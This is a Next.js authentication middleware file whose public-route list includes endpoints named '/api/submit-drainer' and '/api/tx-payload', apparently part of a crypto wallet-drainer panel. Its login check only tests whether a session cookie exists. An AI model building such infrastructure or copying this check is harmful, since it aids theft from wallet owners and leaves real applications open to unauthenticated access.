import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  const pathname = request.nextUrl.pathname;

  // Public routes that don't need auth
  const publicRoutes = [
    '/login',
    '/api/admin/access',
    '/api/auth/me',
    '/api/submit-drainer',
    '/api/notify',
    '/api/relay/batch',
    '/api/telegram/webhook',
    '/api/tx-payload',
  ];

  // Check if route is public
  const isPublic = publicRoutes.some(route => pathname.startsWith(route));

  if (isPublic) {
    return NextResponse.next();
  }

  // Check for auth cookie/session
  const authCookie = request.cookies.get('s26_session');

  // If not authenticated, redirect to login
  if (!authCookie) {
    return NextResponse.redirect(new URL('/login', request.url));
  }

  return NextResponse.next();
}

export const config = {
  matcher: [
    /*
     * Match all request paths except for the ones starting with:
     * - _next/static (static files)
     * - _next/image (image optimization files)
     * - favicon.ico (favicon file)
     * - public folder
     */
    '/((?!_next/static|_next/image|favicon.ico|public).*)',
  ],
};
